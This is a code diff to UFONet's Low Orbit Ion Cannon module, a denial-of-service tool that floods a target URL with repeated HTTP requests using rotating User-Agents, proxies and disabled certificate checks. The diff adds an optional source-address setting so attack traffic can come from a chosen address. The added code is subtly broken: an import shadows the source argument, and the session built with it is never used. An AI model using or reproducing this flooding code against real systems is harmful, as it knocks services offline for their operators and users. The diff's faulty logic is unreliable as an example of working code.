@@ -10,6 +10,7 @@ with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, random
+from core.mods.mod_config import LOIC_SPEED
 try:
     import requests
     from requests.packages.urllib3.exceptions import InsecureRequestWarning # black magic
@@ -19,7 +20,7 @@ except:
     sys.exit(2)
 
 # UFONet DoS Web LOIC (Low Orbit Ion Cannon)
-def ionize(self, target, rounds, proxy):
+def ionize(self, target, rounds, proxy, source = None):
     n=0
     try:
         proxyD = { 
@@ -29,6 +30,14 @@ def ionize(self, target, rounds, proxy):
             n=n+1
             self.user_agent = random.choice(self.agents).strip()
             headers = {'User-Agent': str(self.user_agent)}
+
+            if source is not None: # Allow different source for sending request
+                from requests_toolbelt.adapters import source
+                s = requests.Session()
+                new_source = source.SourceAddressAdapter(source)
+                s.mount("http://", new_source)
+                s.mount("https://", new_source)
+
             try:
                 r = requests.get(target, headers=headers, proxies=proxyD, verify=False)
                 print("[Info] [AI] [LOIC] Firing 'pulse' ["+str(n)+"] -> [HIT!]")
@@ -47,6 +56,6 @@ class LOIC(object):
         for agent in agents:
             self.agents.append(agent)
 
-    def attacking(self, target, rounds, proxy):
+    def attacking(self, target, rounds, proxy, source=None):
         print("[Info] [AI] Low Orbit Ion Cannon (LOIC) is ready to fire: [" , rounds, "pulses ]")
-        ionize(self, target, rounds, proxy) # attack with LOIC using threading
+        ionize(self, target, rounds, proxy, source) # attack with LOIC using threading
